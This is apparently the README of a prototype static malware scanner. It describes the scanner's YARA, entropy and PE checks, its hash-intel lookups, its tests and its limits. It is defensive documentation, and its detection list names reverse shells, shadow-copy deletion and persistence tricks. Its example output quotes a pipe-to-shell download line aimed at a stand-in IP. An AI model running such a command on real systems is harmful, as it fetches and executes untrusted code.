# zscan

A prototype **static** malware scanner: YARA rule matching plus simple file heuristics.
It only reads bytes. It never runs or emulates the files it scans, and archives are
opened in memory, never extracted to disk.

## What it checks

| Check | What it looks for |
|---|---|
| Hashes | MD5, SHA-1, SHA-256 of every file |
| Archives | Looks inside zip (incl. docx/jar/apk), tar and gzip, up to 3 levels deep, in memory. Flags zip bombs and password-protected members. An archive takes the verdict of its worst member, shown as `outer.zip!inner/file.exe`. |
| Threat intel | Offline known-bad hash lists (`--hashlist`, plus the MalwareBazaar list from `--update`). With `--intel`: CIRCL hashlookup (known-good files), MalwareBazaar and VirusTotal. Only hashes are sent, never file contents. |
| Community YARA | `zscan --update` downloads the [YARA-Forge](https://github.com/YARAHQ/yara-forge) rule package (about 5,000 curated rules in `core`) and loads it automatically from then on |
| YARA | Bundled starter rules in `zscan/rules/` (EICAR, UPX packing, ransomware recovery-blocking commands, injection API strings, Office auto-exec macros, PHP webshells), or your own with `-r` |
| Entropy | Whole-file and per-PE-section Shannon entropy (packed or encrypted content) |
| PE heuristics | Packer section names, writable+executable sections, entry point outside or in the last section, missing imports, import combos that suggest injection, keylogging, anti-debugging or privilege tweaks, bad timestamps, overlays |
| Suspicious strings | Encoded PowerShell, download cradles, shadow-copy deletion, Run-key persistence, reverse shells, pipe-to-shell, ransom-note text, raw-IP URLs, .onion addresses, big base64 blobs. String hits count one level lower inside compiled binaries, which embed lots of harmless text. |

Each finding has a severity (INFO, LOW, MED, HIGH, CRIT). Findings add up to a 0 to 100 score:
any CRIT or a score of 70+ is **malicious**, 15+ is **suspicious**, the rest **clean**.

## Install and run

```bash
pip install -e .            # needs yara-python and pefile
zscan path/to/file_or_dir   # or: python -m zscan ...
zscan -q ~/Downloads        # only show non-clean files
zscan --json dir > report.json
zscan -r my_rules/ dir      # use your own YARA rules instead of the bundled ones
zscan --update              # fetch YARA-Forge rules + MalwareBazaar recent hashes
zscan --intel suspicious.exe   # also look the hash up online
```

### Community rules (`--update`)

Downloads YARA-Forge's latest release (`--rule-pack core|extended|full`, default `core`), checks it
compiles, and stores it precompiled in the cache folder (`~/.cache/zscan`, or `$ZSCAN_HOME`). If a
download is broken, the previous rules stay in place. YARA-Forge `score` maps to severity:
85+ CRIT, 70+ HIGH, 60+ MED, lower LOW. Use `--no-community` to scan without them. The rules
come from many authors under their own licenses, so they are downloaded, not stored in this repo.

`--update` also tries to save MalwareBazaar's recent SHA-256 list (last 48 hours, CC0) as an
offline hash list that is checked on every scan.

### Online hash lookups (`--intel`)

Off by default, because it sends file hashes to third parties.

| Source | Needs | Result |
|---|---|---|
| CIRCL hashlookup | nothing | INFO "known-good file" if the hash is in NSRL or similar |
| MalwareBazaar | `MALWAREBAZAAR_API_KEY` (free abuse.ch Auth-Key) | CRIT if the hash is a known sample |
| VirusTotal | `VT_API_KEY` | CRIT at 5+ engines, MED at 1 to 4 |

VirusTotal's free tier allows 4 requests a minute, so zscan waits 15 s between calls
(`VT_MIN_INTERVAL` to change it) and only asks about executables, scripts, Office/PDF files,
archives and anything already flagged. Answers are cached for 24 hours. A network failure is a
warning, not a crash.

Exit codes: `0` clean, `1` suspicious found, `2` malicious found, `3` only errors.

Example:

```
MALICIOUS  score=100  samples/eicar.com
    type=text size=68 entropy=4.872 sha256=275a021b...
    [CRIT] YARA: EICAR_Test_File  (EICAR antivirus test file (harmless industry test string))
SUSPICIOUS score= 20  samples/setup.sh
    [MED ] Pipe-to-shell download  (e.g. 'curl http://203.0.113.5:8080/x.sh | bash')
    [LOW ] URL with raw IP address
CLEAN      score=  0  samples/notes.txt
```

## Tests

```bash
pip install -e '.[test]' && pytest
```

Tests build harmless samples at runtime (the EICAR test string, a hand-made non-runnable PE
that looks UPX-packed, scripts with ransomware-style commands, nested and booby-trapped archives).
Network sources are faked, so tests run offline. No real malware is used or stored.

Baseline with the YARA-Forge core rules loaded: 0 false positives on 6,260 files from a stock
Linux system (`/usr/bin`, Python packages, shared libraries) and on 290 real wheels, jars and
tarballs.

## Limits (it's a prototype)

- Static only, so it is easy to evade with obfuscation, and it cannot see behaviour.
- No rar or 7z support, no ELF/Mach-O structure checks yet, files over 64 MiB are skipped.
- Single-threaded: roughly 45 files a second on system binaries with community rules loaded
  (about 150 without).
